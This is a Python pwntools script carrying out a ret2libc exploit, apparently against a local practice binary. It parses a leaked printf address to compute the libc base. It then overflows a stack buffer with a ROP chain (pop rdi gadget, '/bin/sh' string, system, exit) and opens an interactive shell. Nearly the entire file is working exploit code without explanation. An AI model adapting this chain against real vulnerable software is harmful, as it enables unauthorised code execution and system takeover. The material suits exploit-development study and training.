import sys
import pwn

sys.path.append('../../MyTools')
import gadgets_info
import conversion

pwn.context.clear()
pwn.context.update(
	arch = 'amd64', os = 'linux'
)

target_info = {
	'exec_path': './ret2libc_example',
	'libc_info': [],
	'addr_len': 0x8,
	'buf2stack': 0xc,
	'libc_base': 0x0,
	'sh_str_offset': 0x0,
	'system_offset': 0x0,
	'exit_offset': 0x0,
	'pop_rdi_ret_offset': 0x0,
	'pop_rdi_len': 0x1,
}

'''
| buffer  | caller rbp | callee return |
| padding | padding    | rop chain     |
'''

pwn.context.binary = pwn.ELF(target_info['exec_path'])
target_info['libc_info'] = pwn.ELF(target_info['exec_path']).libc

target_info['system_offset'] = target_info['libc_info'].sym['system']
target_info['exit_offset'] = target_info['libc_info'].sym['exit']
target_info['sh_str_offset'] = target_info['libc_info'].search(b'/bin/sh').__next__()

print('[--] tips: may need update new offset')
target_info['pop_rdi_ret_offset'] = gadgets_info.linux_adm64_gadgets['pop_rdi_ret_offset']

conn = pwn.process([target_info['exec_path']])

leak4printf = conn.recvline()
print('[++] receive: leak info = {0}'.format(leak4printf[:-1].decode()))
random_addr = conversion.str2int(leak4printf[16:-1].decode())
target_info['libc_base'] = random_addr - target_info['libc_info'].sym['printf']
print('[++] receive: libc base address = {0}'.format(hex(target_info['libc_base'])))

payload = b'A' * target_info['buf2stack']
payload += b'B' * target_info['addr_len']
payload += pwn.p64(target_info['libc_base'] + target_info['pop_rdi_ret_offset'])
payload += pwn.p64(target_info['libc_base'] + target_info['sh_str_offset'])
payload += pwn.p64(target_info['libc_base'] + target_info['pop_rdi_ret_offset'] + target_info['pop_rdi_len'])
payload += pwn.p64(target_info['libc_base'] + target_info['system_offset'])
payload += pwn.p64(target_info['libc_base'] + target_info['exit_offset'])
conn.send(payload)

conn.interactive()
